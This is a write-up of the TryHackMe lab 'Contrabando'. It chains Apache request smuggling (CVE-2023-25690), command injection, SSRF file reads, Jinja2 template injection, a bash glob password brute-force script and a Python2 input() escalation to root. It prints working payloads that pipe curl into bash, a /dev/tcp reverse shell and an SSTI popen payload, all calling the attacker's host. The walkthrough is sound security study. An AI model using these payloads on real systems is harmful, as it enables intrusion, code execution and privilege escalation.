---
title: "TryHackMe: Contrabando"
author: jaxafed
categories: [TryHackMe]
tags: [linux, web, apache2, ssrf, file disclosure, request smuggling, crlf injection, command injection, rce, docker, ssti, glob, sudo, python]
render_with_liquid: false
media_subpath: /images/tryhackme_contrabando/
image:
  path: room_image.webp
---

**Contrabando** began with exploiting an **HTTP Request Smuggling** vulnerability via **CRLF injection** in **Apache2** to smuggle a request to a backend server. This allowed us to leverage a **command injection** vulnerability on the backend server to obtain a shell inside a Docker container.

Afterwards, using our access inside the container to enumerate the internal network, we discovered an internal web application containing a **Server-Side Request Forgery (SSRF)** vulnerability. By leveraging this to read the application's source code and combining it with a **Server-Side Template Injection (SSTI)** vulnerability we discovered, we obtained a shell on the host.

Finally, we exploited an **unquoted parameter** in a **Bash** script, using **glob matching** to brute-force the user’s password. This allowed us to run a script with **Python2** and exploit a **Remote Code Execution (RCE)** vulnerability to escalate to root and complete the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/contrabando){: .center }

## Initial Enumeration

### Nmap Scan

As usual, we start with a **port scan**.

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.158.77
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 41:ed:cf:46:58:c8:5d:41:04:0a:32:a0:10:4a:83:3b (RSA)
|   256 e8:f9:24:5b:e4:b0:37:4f:00:9d:5c:d3:fb:54:65:0a (ECDSA)
|_  256 57:fd:4a:1b:12:ac:7c:90:80:88:b8:5a:5b:78:30:79 (ED25519)
80/tcp open  http    Apache httpd 2.4.55 ((Unix))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.55 (Unix)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two ports open:

- **22** (`SSH`)
- **80** (`HTTP`)

### Web 80

Visiting `http://10.10.158.77/`, we see a static "coming soon" page with a link to `/page/home.html`.

![Web 80 Index](web_80_index.webp){: width="1200" height="600"}

Visiting `http://10.10.158.77/page/home.html`, we only see a message about a password generator being down and nothing else.

![Web 80 Page Home](web_80_page_home.webp){: width="1200" height="600"}

An interesting observation that will be useful later is that, when checking the response headers, we can see that we are dealing with **two different Apache2 servers**.

![Web 80 Index Burp](web_80_index_burp.webp){: width="1000" height="300"}
![Web 80 Page Home Burp](web_80_page_home_burp.webp){: width="1000" height="300"}

## Foothold

### Examining the Web Application

Fuzzing the webroot does not reveal anything interesting. However, fuzzing the `/page/` endpoint for files shows something unusual: every response returns `200 OK` status.

```console
$ ffuf -u 'http://10.10.158.77/page/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fc 404 -e .php,/
...
09.php                  [Status: 200, Size: 148, Words: 19, Lines: 3, Duration: 129ms]
09                      [Status: 200, Size: 144, Words: 19, Lines: 3, Duration: 137ms]
images.php              [Status: 200, Size: 152, Words: 19, Lines: 3, Duration: 112ms]
...
```
{: .wrap }

Checking one of these responses, we discover something peculiar: whatever we pass after `/page/` in the URL seems to be passed to the `readfile()` function in `/var/www/html/index.php`.

![Web 80 Page Test Burp](web_80_page_test_burp.webp){: width="1000" height="400"}

Of course, instead of some test string, if we pass the path for a valid file (double URL encoded), we can see the `readfile()` call working and are able to read files. Additionally, we are also able to use wrappers like `http://` to make requests and read the response leading to **SSRF** vulnerability.

![Web 80 Page Etc Passwd](web_80_page_etc_passwd.webp){: width="1300" height="500"}

Using this vulnerability to enumerate the machine and make some requests, we quickly discover that we are inside a **Docker container**. However, beyond identifying that the **Apache2 server** runs on `*:8080` (by checking its configuration), we find little else of immediate use.

Going back to fuzzing the `/page/` endpoint, and this time using `-fw 19` to also ignore the errors due to `readfile`, we discover two interesting files: `index.php` and `gen.php`.

```console
$ ffuf -u 'http://10.10.158.77/page/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fc 404 -e .php,/ -fw 19
...
index.php               [Status: 200, Size: 148, Words: 17, Lines: 11, Duration: 135ms]
gen.php                 [Status: 200, Size: 392, Words: 65, Lines: 15, Duration: 127ms]
```
{: .wrap }

Examining `/page/gen.php`, we find a simple PHP script that accepts a `length` parameter via POST and passes it to the `exec` function, leading to a **command injection** vulnerability.

![Web 80 Page Gen Php](web_80_page_gen_php.webp){: width="1300" height="500"}

```php
<?php
function generateRandomPassword($length) {
    $password = exec("tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c " . $length);
    return $password;
}

if(isset($_POST['length'])){
        $length = $_POST['length'];
        $randomPassword = generateRandomPassword($length);
        echo $randomPassword;
}else{
    echo "Please insert the length parameter in the URL";
}
?>
```

Inspecting `/page/index.php`, it looks like this is the script responsible for us being able to read files and make requests. It retrieves the `page` parameter from the GET request and passes it to `readfile()`. Interestingly, our requests to `/page/*` work despite the script expecting a GET parameter instead.

![Web 80 Page Index Php](web_80_page_index_php.webp){: width="1300" height="500"}

```php
<?php 

$page = $_GET['page'];
if (isset($page)) {
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

### Request Smuggling

At this point, we have not uncovered much, but by combining our findings, we can make assumptions about how the application operates. It appears that we are interacting with a **frontend Apache2 server** and when the URL starts with `/page/`, the server extracts the content after it and proxies the request to a **backend Apache2 server** with the `gen.php` and `index.php` files as `http://backend:8080/index.php?page=*`, which stops us from directly accessing the `gen.php` on the backend.

However, we can still access `index.php` on the backend and invoke the `readfile` function with arbitrary input. We can actually use this to reach the `gen.php` on the backend by using it to make a request to `http://127.0.0.1:8080/gen.php`. But with the `readfile()` function, we are limited to **GET requests** and thus can't exploit the command injection vulnerability in the `gen.php` file, which requires a **POST request**.

![Web 80 Page Ssrf Gen Php](web_80_page_ssrf_gen_php.webp){: width="1300" height="500"}

Searching for how this proxy might be set up on Apache2, we can discover that it is probably set up with a configuration like this using `mod_proxy`:

```console
RewriteEngine on
RewriteRule "^/page/(.*)" "http://backend:8080/index.php?page=$1" [P]
ProxyPassReverse "/page/" "http://backend:8080/"
```

Searching for vulnerabilities in **Apache v2.4.55** related to `mod_proxy`, we can discover **CVE-2023-25690**, a **CRLF injection vulnerability** caused by a configuration similar to our assumption. [This repository](https://github.com/dhmosfunk/CVE-2023-25690-POC) explains it well.

Essentially, **Apache2** extracts anything after the `/page/` and appends it to the `http://backend:8080/index.php?page=` request, and using this we are able to smuggle requests to the backend using the **CRLF** (`\r\n`) characters.

For example, in the current state if we were to make a request like:

```console
GET /page/test HTTP/1.1
Host: 10.10.158.77
...
```

On the backend, it is received as:

```
GET /index.php?page=test HTTP/1.1
Host: backend
...
```

Now, if we were to replace the `test` in our request with something like `test HTTP/1.1\r\nHost: localhost\r\n\r\nGET /SMUGGLED` and made a request such as:

```console
GET /page/test%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED
Host: 10.10.158.77
...
```

After the rewrite rule, this would be received by the backend as such and would be interpreted as **two different requests**:

```
GET /index.php?page=test HTTP/1.1
Host: localhost

GET /SMUGGLED HTTP/1.1
Host: backend
...
```

Now with this, if we were able to make a POST request like this to the backend, we could exploit the command injection on `/gen.php` and get a shell:

```console
POST /gen.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

length=;curl 10.14.101.76|bash;
```

> Make sure the `Content-Length` value matches the actual length of the request body.
{: .prompt-warning }

To actually smuggle this request, we can simply set our payload after `/page/` in the URL to:

```console
test HTTP/1.1
Host: localhost

POST /gen.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

length=;curl 10.14.101.76|bash;

GET /test
```

> We actually smuggle a second request after our smuggled POST request to prevent " HTTP/1.1" and any headers appended by **Apache** from interfering with our payload.
{: .prompt-tip }

Encoded as:
```
test%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0APOST%20/gen.php%20HTTP/1.1%0D%0AHost:%20localhost%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2031%0D%0A%0D%0Alength=;curl%2010.14.101.76%7Cbash;%0D%0A%0D%0AGET%20/test
```
{: .wrap }

When this is transformed by the rewrite rule, it would end up on the backend like:

```
GET /index.php?page=test HTTP/1.1
Host: localhost

POST /gen.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

length=;curl 10.14.101.76|bash;

GET /test HTTP/1.1
Host: backend
...
```

Next, we host a reverse shell payload on our web server:

```console
$ cat index.html
/bin/bash -i >& /dev/tcp/10.14.101.76/443 0>&1

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

And making the request with our **HTTP smuggling payload**:

![Web 80 Page Request Smuggling](web_80_page_request_smuggling.webp){: width="1300" height="500"}

We can see the target fetching the reverse shell payload:

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.158.77 - - [16/Aug/2025 17:23:06] "GET / HTTP/1.1" 200 -
```

And on our listener we are able to get a shell as `www-data` inside a container.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.14.101.76] from (UNKNOWN) [10.10.158.77] 40064
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@124a042cc76c:/var/www/html$ script -qc /bin/bash /dev/null
www-data@124a042cc76c:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg
[1]  - continued  nc -lvnp 443

www-data@124a042cc76c:/var/www/html$ export TERM=xterm
www-data@124a042cc76c:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Shell as hansolo

### Scanning the Network

Enumerating the container, we can find its IP as `172.18.0.3` and scanning the network with **RustScan**, we discover an unusual port open on the host at `172.18.0.1:5000`.

```console
www-data@124a042cc76c:/tmp$ hostname -I
172.18.0.3
www-data@124a042cc76c:/tmp$ curl -s http://10.14.101.76/rustscan -o rustscan
www-data@124a042cc76c:/tmp$ chmod +x rustscan
www-data@124a042cc76c:/tmp$ ./rustscan --top -a 172.18.0.1,172.18.0.2 --accessible
Open 172.18.0.1:22
Open 172.18.0.1:80
Open 172.18.0.2:80
Open 172.18.0.1:5000
```

### SSRF

Accessing `http://172.18.0.1:5000/` with **curl**, we observe a form for submitting URLs via a **POST** request.

```console
www-data@124a042cc76c:/var/www/html$ curl -s http://172.18.0.1:5000/
<!DOCTYPE html>
<html>
<head>
    <title>Website Display</title>
</head>
<body>
    <h1>Fetch Website Content</h1>
    <h2>Currently in Development</h2>
    <form method="POST">
        <label for="website_url">Enter Website URL:</label>
        <input type="text" name="website_url" id="website_url" required>
        <button type="submit">Fetch Website</button>
    </form>
    <div>

    </div>
</body>
</html>
```

Testing it with a request and giving the URL for our own machine:

```console
www-data@124a042cc76c:/var/www/html$ curl -s -d 'website_url=http://10.14.101.76/'  http://172.18.0.1:5000/
```
{: .wrap }

On our listener, not only we see the server making a request, but also from the **User-Agent** we see it uses **PycURL** for it.

```console
$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.14.101.76] from (UNKNOWN) [10.10.158.77] 56062
GET / HTTP/1.1
Host: 10.14.101.76
User-Agent: PycURL/7.45.2 libcurl/7.68.0 OpenSSL/1.1.1f zlib/1.2.11 brotli/1.0.7 libidn2/2.2.0 libpsl/0.21.0 (+libidn2/2.2.0) libssh/0.9.3/openssl/zlib nghttp2/1.40.0 librtmp/2.3
Accept: */*
```
{: .wrap }

Testing further, we can confirm it not only makes the request but also displays the response it receives.

```console
$ echo 'TEST' > test.txt
$ python3 -m http.server 80
```

```console
www-data@124a042cc76c:/var/www/html$ curl -s -d 'website_url=http://10.14.101.76/test.txt'  http://172.18.0.1:5000/
...
    <div>
        TEST

    </div>
...
```
{: .wrap }

Since it uses **PycURL**, which accepts `file://` as a valid protocol, we can use this to read files from the server and reading the `/etc/passwd` file reveals the `hansolo` user, in addition to `root`.

```console
www-data@124a042cc76c:/var/www/html$ curl -s -d 'website_url=file:///etc/passwd'  http://172.18.0.1:5000/
...
<div>
  root:x:0:0:root:/root:/bin/bash
  ...
  hansolo:x:1000:1000::/home/hansolo:/bin/bash
</div>
...
```
{: .wrap }

Checking `/proc/self/status`, we can see the application running as the `hansolo` user.

```console
www-data@124a042cc76c:/var/www/html$ curl -s -d 'website_url=file:///proc/self/status'  http://172.18.0.1:5000/
....
Uid:    1000    1000    1000    1000
Gid:    1000    1000    1000    1000
...
```
{: .wrap }

After trying to get some easy wins by attempting to read SSH keys, etc. yields no results, we can try to read the source code for the application to understand what it does. From `/proc/self/cmdline` we can get the path for it.

```console
www-data@124a042cc76c:/var/www/html$ curl -s -d 'website_url=file:///proc/self/cmdline' http://172.18.0.1:5000/ -o-
...
<div>
    /usr/bin/python3/home/hansolo/app/app.py
</div>
...
```
{: .wrap }

Now, with `/home/hansolo/app/app.py` we can read the application’s source code.

```console
www-data@124a042cc76c:/var/www/html$ curl -s -d 'website_url=file:///home/hansolo/app/app.py' http://172.18.0.1:5000/
```
{: .wrap }

```py
from flask import Flask, render_template, render_template_string, request
import pycurl
from io import BytesIO

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def display_website():
    if request.method == 'POST':
        website_url = request.form['website_url']

        # Use pycurl to fetch the content of the website
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, website_url)
        c.setopt(c.WRITEDATA, buffer)
        c.perform()
        c.close()

        # Extract the content and convert it to a string
        content = buffer.getvalue().decode('utf-8')
        buffer.close()
        website_content = '''
        <!DOCTYPE html>
<html>
<head>
    <title>Website Display</title>
</head>
<body>
    <h1>Fetch Website Content</h1>
    <h2>Currently in Development</h2>
    <form method="POST">
        <label for="website_url">Enter Website URL:</label>
        <input type="text" name="website_url" id="website_url" required>
        <button type="submit">Fetch Website</button>
    </form>
    <div>
        %s
    </div>
</body>
</html>'''%content

        return render_template_string(website_content)

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host="0.0.0.0",debug=False)
```
{: file="/home/hansolo/app/app.py" }


### SSTI

The source code reveals a simple **Flask** application. On a **POST request**, it retrieves a URL from the `website_url` parameter, fetches its content using **PycURL**, and formats the response into `website_content`, which is passed to `render_template_string`.

The vulnerability lies in our ability to control the URL and, consequently, the response content. This allows us to inject a template into `website_content`, which is then processed by the **Jinja2 templating engine** via `render_template_string`, enabling **Server-Side Template Injection (SSTI)**.

So if we were to host a file with malicious template such as:

```console
$ cat template
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.14.101.76|bash').read() }}                           

$ python3 -m http.server 80
```
{: .wrap }

When we make the site fetch it, the response would be a template that would be formatted into the HTML code present in the application code and would get passed to `render_template_string` and executed.

```console
www-data@124a042cc76c:/var/www/html$ curl -s -d 'website_url=http://10.14.101.76/template'  http://172.18.0.1:5000/
```
{: .wrap }

We can see the server first fetching the template and then our reverse shell payload:

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.158.77 - - [16/Aug/2025 20:37:29] "GET /template HTTP/1.1" 200 -
10.10.158.77 - - [16/Aug/2025 20:37:29] "GET / HTTP/1.1" 200 -
```

And on our listener, we obtain a shell as the `hansolo` user and can read the first flag.

```console
$ nc -lvnp 443
hansolo@contrabando:~$ python3 -c 'import pty;pty.spawn("/bin/bash");'
hansolo@contrabando:~$ export TERM=xterm
hansolo@contrabando:~$ ^Z
zsh: suspended  nc -lvnp 443

$ stty raw -echo; fg
[1]  + continued  nc -lvnp 443

hansolo@contrabando:~$ id
uid=1000(hansolo) gid=1000(hansolo) groups=1000(hansolo)
hansolo@contrabando:~$ wc -c h*.txt
36 h[REDACTED].txt
```

## Shell as root

### Checking Sudo Privileges

Checking the **sudo privileges** for the user, we can see that we are able to run two commands as root:

- `/usr/bin/bash /usr/bin/vault` without knowing the password for the `hansolo` user.
- `/usr/bin/python* /opt/generator/app.py` if we discover the password for the user.

```console
hansolo@contrabando:~$ sudo -l
Matching Defaults entries for hansolo on contrabando:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hansolo may run the following commands on contrabando:
    (root) NOPASSWD: /usr/bin/bash /usr/bin/vault
    (root) /usr/bin/python* /opt/generator/app.py
```

### Brute-forcing the Password

Since we need the password for the second command, let's check out the `/usr/bin/vault` script which we can run.

```bash
#!/bin/bash

check () {
        if [ ! -e "$file_to_check" ]; then
            /usr/bin/echo "File does not exist."
            exit 1
        fi
        compare
}


compare () {
        content=$(/usr/bin/cat "$file_to_check")

        read -s -p "Enter the required input: " user_input

        if [[ $content == $user_input ]]; then
            /usr/bin/echo ""
            /usr/bin/echo "Password matched!"
            /usr/bin/cat "$file_to_print"
        else
            /usr/bin/echo "Password does not match!"
        fi
}

file_to_check="/root/password"
file_to_print="/root/secrets"

check
```
{: file="/usr/bin/vault" }

Looking at the script, we can see a vulnerability in the `if [[ $content == $user_input ]]; then` line, as the `$user_input` parameter which is read from the user is not quoted. This allows us to use **glob matching** in the comparison as such:

```bash
$ user_input="*"; if [[ "password" == "$user_input" ]]; then echo "TRUE"; else echo "FALSE"; fi
FALSE

$ user_input="*"; if [[ "password" == $user_input ]]; then echo "TRUE"; else echo "FALSE"; fi
TRUE
```

Exploiting this by entering `*` as our input, we are able to bypass the check and access the contents of `/root/secrets`, though it provides no useful information.

```console
hansolo@contrabando:~$ sudo /usr/bin/bash /usr/bin/vault
Enter the required input: *
Password matched!
1. Lightsaber Colors: Lightsabers in Star Wars can come in various colors, and the color often signifies the Jedi's role or affiliation. For ...
```

But simply bypassing the check is not all we can do. In fact, using the **glob matching**, we can also brute-force the value of the `$content` parameter, which is read from `/root/password`, by looping through all characters and prepending them to `*` and checking the behavior of the script similar to a process like this:

```console
$ user_input="a*"; if [[ "password" == $user_input ]]; then echo "TRUE"; else echo "FALSE"; fi
FALSE

$ user_input="b*"; if [[ "password" == $user_input ]]; then echo "TRUE"; else echo "FALSE"; fi
FALSE

...

$ user_input="p*"; if [[ "password" == $user_input ]]; then echo "TRUE"; else echo "FALSE"; fi
TRUE

$ user_input="pa*"; if [[ "password" == $user_input ]]; then echo "TRUE"; else echo "FALSE"; fi
TRUE

$ user_input="paa*"; if [[ "password" == $user_input ]]; then echo "TRUE"; else echo "FALSE"; fi
FALSE

$ user_input="pab*"; if [[ "password" == $user_input ]]; then echo "TRUE"; else echo "FALSE"; fi
FALSE
...
```

We can automate this process with a **Python** script that loops through all characters prepended to `*` and checks if the output from the script includes `Password matched!`. If it does, we know we have discovered a character from the beginning of the password and can move on to the next character.

```python
import subprocess
import string

charset = string.ascii_letters + string.digits
password = ""

while True:
    found = False
    for char in charset:
        attempt = password + char + "*"
        print(f"\r[+] Password: {password+char}", end="")
        proc = subprocess.Popen(
            ["sudo", "/usr/bin/bash", "/usr/bin/vault"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = proc.communicate(input=attempt + "\n")
        if "Password matched!" in stdout:
            password += char
            found = True
            break
    if not found:
        break

print(f"\r[+] Final Password: {password}")
```
{: file="brute.py" }

Running the script reveals the password from `/root/password`.

```console
hansolo@contrabando:~$ python3 brute.py
[+] Final Password: EQ[REDACTED]fZ
```

### Python2 RCE

While the password does not work for the root account, it works for the `hansolo` user, which we can use with **SSH** to get a better shell.

```console
$ ssh hansolo@10.10.158.77
hansolo@contrabando:~$ id
uid=1000(hansolo) gid=1000(hansolo) groups=1000(hansolo)
```

With the password, we can now also run the second **sudo** command.

```console
hansolo@contrabando:~$ sudo -l
Matching Defaults entries for hansolo on contrabando:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hansolo may run the following commands on contrabando:
    (root) NOPASSWD: /usr/bin/bash /usr/bin/vault
    (root) /usr/bin/python* /opt/generator/app.py
```

Checking the `/opt/generator/app.py` script, it is a simple password generator:

```py
import random
import string

def generate_password(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    random.seed()
    secret = input("Any words you want to add to the password? ")
    password_characters = list(characters + secret)
    random.shuffle(password_characters)
    password = ''.join(password_characters[:length])

    return password

try:
    length = int(raw_input("Enter the desired length of the password: "))
except NameError:
    length = int(input("Enter the desired length of the password: "))
except ValueError:
    print("Invalid input. Using default length of 12.")
    length = 12

password = generate_password(length)
print("Generated Password:", password)
```
{: file="/opt/generator/app.py" }

From the sudo command, we can see that we are able to run it with `/usr/bin/python*`. Checking the available binaries, `python2` is also present:

```console
hansolo@contrabando:~$ ls -la /usr/bin/python*
lrwxrwxrwx 1 root root       9 Mar 13  2020 /usr/bin/python2 -> python2.7
-rwxr-xr-x 1 root root 3657904 Dec  9  2024 /usr/bin/python2.7
lrwxrwxrwx 1 root root       9 Mar 13  2020 /usr/bin/python3 -> python3.8
-rwxr-xr-x 1 root root 5490456 Mar 18 20:04 /usr/bin/python3.8
lrwxrwxrwx 1 root root      33 Mar 18 20:04 /usr/bin/python3.8-config -> x86_64-linux-gnu-python3.8-config
lrwxrwxrwx 1 root root      16 Mar 13  2020 /usr/bin/python3-config -> python3.8-config
```

**Python2** being available makes this line in the `generate_password` function problematic:

```py
secret = input("Any words you want to add to the password? ")
```

With **python3**, the script would error out at `raw_input()` and fall back to `input()`, which safely casts input to a string, so both `input()` calls would work as expected.

```console
$ python3
Python 3.13.3 (main, Apr 10 2025, 21:38:51) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.

>>> print(raw_input("input: "))
Traceback (most recent call last):
  File "<python-input-1>", line 1, in <module>
    print(raw_input("input: "))
          ^^^^^^^^^
NameError: name 'raw_input' is not defined

>>> print(input("input: "))
input: __import__("os").system("whoami")
__import__("os").system("whoami")
```

However, with **Python2**, the behavior differs. `raw_input()` behaves like `input()` in Python3, but `input()` in Python2 **evaluates** the input as code instead of treating it as a string:

```console
$ python2
Python 2.7.18 (default, Aug  1 2022, 06:23:55)
[GCC 12.1.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.

>>> print(raw_input("input: "))
input: __import__("os").system("whoami")
__import__("os").system("whoami")

>>> print(input("input: "))
input: __import__("os").system("whoami")
kali
0
```

Running the script with `python2` and providing `__import__("os").system("bash")` at the `secret` prompt spawns a root shell, allowing us to read the root flag.

```console
hansolo@contrabando:~$ sudo /usr/bin/python2 /opt/generator/app.py
[sudo] password for hansolo:
Enter the desired length of the password: 1
Any words you want to add to the password? __import__("os").system("bash")
root@contrabando:/home/hansolo# id
uid=0(root) gid=0(root) groups=0(root)
root@contrabando:/home/hansolo# wc -c /root/root.txt
25 /root/root.txt
```

### Apache Configuration

Lastly, checking the Apache configuration inside the Docker container (the one used as a proxy), we can see the configuration that led to the **HTTP Smuggling** vulnerability:

```console
root@8783651820fd:/usr/local/apache2# cat /usr/local/apache2/conf/httpd.conf
...
<VirtualHost *:80>

    ServerName localhost
    DocumentRoot /usr/local/apache2/htdocs

    RewriteEngine on
    RewriteRule "^/page/(.*)" "http://backend-server:8080/index.php?page=$1" [P]
    ProxyPassReverse "/page/" "http://backend-server:8080/"

</VirtualHost>
```

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
